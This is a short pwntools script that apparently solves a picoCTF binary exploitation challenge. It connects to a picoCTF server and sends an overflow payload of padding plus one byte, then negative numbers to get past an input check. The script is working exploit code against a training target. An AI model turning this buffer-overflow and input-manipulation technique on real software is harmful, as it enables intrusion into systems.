from pwn import *

context.binary = exe = ELF('./vuln')
context.log_level = 'debug'

# p = process('./vuln')
p = connect('saturn.picoctf.net', 52190)

payload = b'B'*20 + b'\x11'
p.sendlineafter(b'a 1337 >> ', payload)

payload = b"-16 -314"
p.sendlineafter(b'less than 10.\n', payload)

p.interactive()